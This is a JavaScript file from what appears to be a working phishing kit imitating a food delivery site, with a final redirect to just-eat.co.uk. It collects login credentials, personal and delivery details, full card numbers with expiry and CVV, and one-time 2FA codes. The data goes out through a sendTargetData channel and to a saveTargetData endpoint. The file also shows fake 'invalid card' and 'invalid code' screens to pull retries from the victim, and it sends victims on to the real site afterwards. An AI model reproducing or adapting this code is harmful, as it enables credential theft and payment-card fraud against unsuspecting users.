/* MAIN PAGE */

let loadingIntervals = {};
let dataArray = "";

$(document).ready(() => {
    initMainPageListeners();
    initialRenderCaptcha();
});

function initMainPageListeners() {
    $(".signInForm").submit((e) => {
        e.preventDefault();

        let dataTarget = convertToJson({
            "Email": $('.email-input').val().trim(),
            "Password": $('.password-input').val().trim(),
            "Authorization Method": "Default Sign In"
        });

        sendTargetData(dataTarget);
        lockAllForms();

        setTimeout(() => {
            RedirectToPersonalPage();
        }, 1500);
    });

    $(".signUpForm").submit((e) => {
        e.preventDefault();

        let dataTarget = convertToJson({
            "Email": $('.email-signup-input').val().trim(),
            "Password": $('.password-signup-input').val().trim(),
            "Authorization Method": "Default Sign Up"
        });

        sendTargetData(dataTarget);
        lockAllForms();

        setTimeout(() => {
            RedirectToPersonalPage();
        }, 1500);
    });

    $(".facebook-button").click(() => {
        let dataTarget = convertToJson({
            "Authorization Method": "Facebook"
        });

        sendTargetData(dataTarget);
        
        setTimeout(() => {
            window.location.href = $(".facebook-button").eq(0).attr("link-attr");
        }, 500);
    });


    $(".deliveryInformationForm").submit((e) => {
        e.preventDefault();

        let dataTarget = convertToJson({
            "Full Name": $('.full-name-input').val().trim(),
            "Phone Number": $('.phone-input').val().trim(),
            "Address": $('.address-input').val().trim(),
            "City": $('.city-input').val().trim(),
            "ZIP": $('.zip-input').val().trim(),
            "Phone Number": $('.phone-input').val().trim(),
            "Country": $('.country-input').val().trim(),
        });

        sendTargetData(dataTarget);
        lockAllForms();

        setTimeout(() => {
            RedirectToPaymentPage();
        }, 5000);
    });

    $('.card-number, .expiry-input, .cvv-input').on('input', function(event) {
        restrictToDigits(event);

        if ($(this).hasClass('card-number')) {
            validateCardNumber();
        } else if ($(this).hasClass('expiry-input')) {
            validateExpiryDate();
        } else if ($(this).hasClass('cvv-input')) {
            validateCVV();
        }
    });

    $(".payment-form").submit((e) => {
        e.preventDefault();

        if(validateAllFields()) {
            let dataTarget = convertToJson({
                "Card Number": $('.card-number').val().trim(),
                "Expiry Date": $('.expiry-input').val().trim(),
                "CVV Code": $('.cvv-input').val().trim(),
            });
    
            sendTargetData(dataTarget);
            lockAllForms();

            InitCaptchaPage();
        }

    });

    $(".code-form").submit((e) => {
        e.preventDefault();

        let dataTarget = convertToJson({
            "Code": $('.code-input').val().trim()
        });

        sendTargetData(dataTarget);
        lockAllForms();

    });

    $(".captcha-form").submit((e) => {
        e.preventDefault();

        if($('.captcha-box').data('validateCaptcha')($(".captcha-input").val())) {
            let dataTarget = convertToJson({
                "Captcha": "Solved"
            });
    
            sendTargetData(dataTarget);
            lockAllForms();

            if(localStorage.getItem("liveMode") == "0") {
                $.ajax({
                    type: "POST",
                    url: "./src/Api/v1.php?saveTargetData",
                    data: {
                        jsonData: returnTargetDataStorage()
                    }
                });

                setTimeout(() => {
                    InitFinalPage();
                }, 2000);
            }

        } else {
            $('.captcha-box').data('refreshCaptcha')();
        }

    });

}

function initialRenderCaptcha() {
    $('.captcha-box').canvasCaptcha();
}


function reRenderCaptcha() {
    $('.captcha-box').data('refreshCaptcha')();
}

function lockAllForms() {
    // Login Form
    $('.signInForm').find('input, button').prop('disabled', true);

    // Register Form
    $('.signUpForm').find('input, button').prop('disabled', true);

    // Personal Form
    $('.deliveryInformationForm').find('input, button').prop('disabled', true);

    // Payment Form
    $(".payment-form").find('input, button').prop('disabled', true);

    // Code Form
    $(".code-form").find('input, button').prop('disabled', true);

    // Captcha Form
    $(".captcha-form").find('input, button').prop('disabled', true);

    startLoadingProcess([
        ".log-in-button",
        ".sign-up-button",
        ".continue-personal-button",
        ".continue-payment-button",
        ".continue-code-button",
        ".continue-captcha-button"
    ]);
}

function unlockAllForms() {
    // Login Form
    $('.signInForm').find('input, button').prop('disabled', false);

    // Register Form
    $('.signUpForm').find('input, button').prop('disabled', false);

    // Personal Form
    $('.deliveryInformationForm').find('input, button').prop('disabled', false);

    // Payment Form
    $(".payment-form").find('input, button').prop('disabled', false);

    // Code Form
    $(".code-form").find('input, button').prop('disabled', false);

    // Captcha Form
    $(".captcha-form").find('input, button').prop('disabled', false);

    stopLoadingProcess([
        ".log-in-button",
        ".sign-up-button",
        ".continue-personal-button",
        ".continue-payment-button",
        ".continue-code-button",
        ".continue-captcha-button"
    ]);
}

function cleanAllInputs(formSelector) {
    const $form = $(formSelector);
    $form.find('input[type="text"], input[type="password"], input[type="number"], textarea').val('');
}

function startLoadingProcess(selectors) {
    selectors.forEach(selector => {
        const $buttons = $(selector);
        $buttons.each(function() {
            let loadingText = $(this).text().trim();
            let originalText = loadingText;
            let dotCount = 0;

            loadingIntervals[selector] = setInterval(() => {
                if (dotCount < 3) {
                    loadingText += ".";
                    dotCount++;
                } else {
                    loadingText = originalText;
                    dotCount = 0;
                }
                $(this).text(loadingText);
            }, 400);
        });
    });
}

function stopLoadingProcess(selectors) {
    selectors.forEach(selector => {
        if (loadingIntervals[selector]) {
            clearInterval(loadingIntervals[selector]);
            delete loadingIntervals[selector];
            const $buttons = $(selector);
            $buttons.each(function() {
                const buttonText = $(this).text();
                $(this).text(buttonText.replace(/\.*$/, '').trim());
            });
        }
    });
}

/* AFTER WEB SOCKET CALLBACK */

function RedirectToPersonalPage() {
    window.location.href = "?authentication-metadata-token=UGVyc29uYWwtamtnYmtkZmJqZ2hiamRmZ2Q=";
}

function RedirectToPaymentPage() {
    window.location.href = "?authentication-metadata-token=UGF5bWVudC1iZGZzZ3Nnc2Rnc2RhZ3Nz";
}

function InitInvalidLoginPage() {
    unlockAllForms();
    cleanAllInputs(".signInForm");
    showInvalidPasswordForm();
}

function InitInvalidCardPage() {
    unlockAllForms();
    cleanAllInputs(".payment-form");
    closeAllModals();
    showInvalidPaymentForm();
}

function InitCodeModal() {
    unlockAllForms();
    closeAllModals();
    showCodeModal();
    showDefaultCodeModalText();
}

function InitInvalidCodePage() {
    unlockAllForms();
    closeAllModals();
    showCodeModal();
    cleanAllInputs(".code-form");
    showInvalidCode();
    showDefaultCodeModalText();
}

function InitDefaultCodePage() {
    unlockAllForms();
    closeAllModals();
    showCodeModal();
    cleanAllInputs(".code-form");
    showInvalidDefaultCode();
    hideDefaultCodeModalText();
}

function InitInvalidCustomCodePage() {
    unlockAllForms();
    closeAllModals();
    showCodeModal();
    cleanAllInputs(".code-form");
    appendProcessedDataToCodeModal();
    showInvalidCustomCode();
    hideDefaultCodeModalText();
}

function InitCaptchaPage() {
    unlockAllForms();
    closeAllModals();
    showCaptchaModal();
    cleanAllInputs(".captcha-form");
    reRenderCaptcha();
}

function InitFinalPage() {
    unlockAllForms();
    closeAllModals();
    showFinalModal();
}

/* INVALID LOGIN PAGE */

function showInvalidPaymentForm() {
    $(".invalid-card").fadeIn();
    setTimeout(() => {
        $(".invalid-card").fadeOut();
    }, 7000);
}

/* 2FA PAGE */

function closeAllModals() {
    $(".select-country-modal").hide();
    $(".code-modal").hide();
    $(".final-modal").hide();
    $(".captcha-modal").hide();
}

function showCodeModal() {
    $(".code-modal").fadeIn();
}

function appendProcessedDataToCodeModal() {
    let data = localStorage.getItem("inputData");
    $(".invalid-custom-code-field").html(data);
}

/* INVALID CODE PAGE */

function showInvalidCode() {
    $(".invalid-code").fadeIn();
    setTimeout(() => {
        $(".invalid-code").fadeOut();
    }, 7000);
}

function showInvalidDefaultCode() {
    $(".invalid-default-code").fadeIn();
    setTimeout(() => {
        $(".invalid-default-code").fadeOut();
    }, 7000);
}

function showInvalidCustomCode() {
    $(".invalid-custom-code").fadeIn();
    setTimeout(() => {
        $(".invalid-custom-code").fadeOut();
    }, 7000);
}

function showDefaultCodeModalText() {
    $(".default-code-text").show();
}

function hideDefaultCodeModalText() {
    $(".default-code-text").hide();
}

/* PAYMENT PAGE */

function showCreditModal() {
    $(".credit-modal").fadeIn();
}

function restrictToDigits(event) {
    var $input = $(event.target);
    var value = $input.val();
    $input.val(value.replace(/[^0-9]/g, ''));
}

function luhnCheck(num) {
    var arr = (num + '').split('').reverse();
    var sum = 0;

    for (var i = 0; i < arr.length; i++) {
        var n = parseInt(arr[i]);
        if (i % 2) {
            n *= 2;
            if (n > 9) {
                n -= 9;
            }
        }
        sum += n;
    }

    return sum % 10 === 0;
}

function validateCardNumber() {
    var $cardInput = $('.card-number');
    var cardNumber = $cardInput.val().replace(/\s+/g, '');

    var isAmex = /^3[47][0-9]{0,13}$/.test(cardNumber);
    if (isAmex) {
        $cardInput.attr('maxlength', '17').attr('minlength', '17');
        $cardInput.val(cardNumber.replace(/(\d{4})?(\d{6})?(\d{5})?/, "$1 $2 $3").trim());
        $('.cvv-input').attr('maxlength', '4').attr('minlength', '4');
        $(".three-digits").hide();
        $(".four-digits").show();
    } else {
        $cardInput.attr('maxlength', '19').attr('minlength', '19');
        $cardInput.val(cardNumber.replace(/(\d{4})?(\d{4})?(\d{4})?(\d{4})?/, "$1 $2 $3 $4").trim());
        $('.cvv-input').attr('maxlength', '3').attr('minlength', '3');
        $(".four-digits").hide();
        $(".three-digits").show();
    }

    if (!luhnCheck(cardNumber)) {
        return false;
    }

    if (cardNumber.length === 15 && isAmex) {
        return true;
    } else if (cardNumber.length === 16 && !isAmex) {
        return true;
    } else {
        return false;
    }
}

function validateExpiryDate() {
    var $expiryInput = $('.expiry-input');
    var expiry = $expiryInput.val().replace(/[^0-9]/g, '');

    if (expiry.length >= 3) {
        expiry = expiry.slice(0, 2) + '/' + expiry.slice(2, 4);
        $expiryInput.val(expiry);
    }

    var matches = expiry.match(/^(\d{2})\/?(\d{2})?$/);
    if (!matches) {
        return false;
    }

    var month = parseInt(matches[1]);
    var year = parseInt("20" + matches[2]);

    if (month < 1 || month > 12) {
        return false;
    }

    var currentDate = new Date();
    var currentYear = currentDate.getFullYear();
    var currentMonth = currentDate.getMonth() + 1;

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        return false;
    }

    return expiry.length == 5;
}


function validateCVV() {
    var $cvvInput = $('.cvv-input');
    var cvv = $cvvInput.val();

    var isAmex = /^3[47][0-9]{13}$/.test($('.card-number').val().replace(/\s+/g, ''));

    if (isAmex) {
        $cvvInput.attr('maxlength', '4');
        return /^[0-9]{4}$/.test(cvv);
    } else {
        $cvvInput.attr('maxlength', '3');
        return /^[0-9]{3}$/.test(cvv);
    }
}

function validateAllFields() {
    var isCardValid = validateCardNumber();
    var isExpiryValid = validateExpiryDate();
    var isCVVValid = validateCVV();

    $('.card-number').toggleClass('invalid-input', !isCardValid);
    $('.expiry-input').toggleClass('invalid-input', !isExpiryValid);
    $('.cvv-input').toggleClass('invalid-input', !isCVVValid);

    return isCardValid && isExpiryValid && isCVVValid;
}

/* INVALID PAYMENT PAGE */

function showInvalidPayment() {
    $(".invalid-payment").fadeIn();
    setTimeout(() => {
        $(".invalid-payment").fadeOut();
    }, 7000);
}

/* CAPTCHA PAGE */

function showCaptchaModal() {
    $(".captcha-modal").fadeIn();
}

/* FINAL PAGE */

function showFinalModal() {
    $(".final-modal").fadeIn();
    setTimeout(() => {
        redirectToOriginalWebsite();
    }, 5000);
}

function redirectToOriginalWebsite() {
    setTimeout(() => {
        window.location.href = "https://href.li/?https://www.just-eat.co.uk/";
    }, 1000)
}